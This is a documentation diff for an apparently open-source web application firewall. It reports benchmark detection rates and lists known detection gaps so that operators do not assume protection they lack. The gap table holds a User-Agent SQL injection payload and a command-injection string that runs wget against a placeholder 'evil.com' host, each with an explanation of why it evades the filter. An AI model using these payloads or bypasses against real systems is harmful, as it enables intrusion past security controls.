@@ -141,3 +141,25 @@ detection on real-context attacks. On the CRS regression-test corpus
 purple-wolf flags ~19% of atomic test inputs — that is by design, not a
 regression. The strength is fewer false positives and a much smaller runtime
 footprint.
+
+For the live-stack measurement across 12 CRS rule classes (4 536
+vectors total), see [`benchmark.md`](benchmark.md). Headline: 14.55%
+overall TPR with 0% FPR on the benign corpus, vs Coraza http-wasm at
+6.11% TPR on the same yardstick. Numbers are honest, low, and
+intentional — they're the cost of context-aware-only detection.
+
+### Known coverage gaps (empirical)
+
+Specific patterns that the live-stack benchmark proved are NOT
+blocked. Surface them so operators don't assume coverage they don't
+have. Workarounds noted; threat-model rationale is in
+[THREAT_MODEL.md §3.2.1](../THREAT_MODEL.md).
+
+| Class | Example payload | Why it slips through | Workaround |
+|---|---|---|---|
+| User-Agent SQLi with `Mozilla/` prefix | `User-Agent: Mozilla/5.0 1 OR 1=1` | libinjection treats Mozilla-prefixed strings as user-agent content, not a SQL expression context | Add custom UA signatures upstream, or validate UA-derived fields at the backend |
+| Bare shell-command in query (`;wget`, `;curl`, `;nc`) | `?cmd=;wget evil.com/x` | No literal signature for `;<cmd>` patterns (the signatures group catches `$(...)`, `` ` ``, `/bin/sh` but not bare `;cmd`) | Add to a custom signature set (compile-time today; runtime customization is future work) |
+
+These are *additions* to the existing precision-over-recall stance,
+not regressions — same design, just surfaced explicitly so adopters
+don't infer coverage that isn't there.
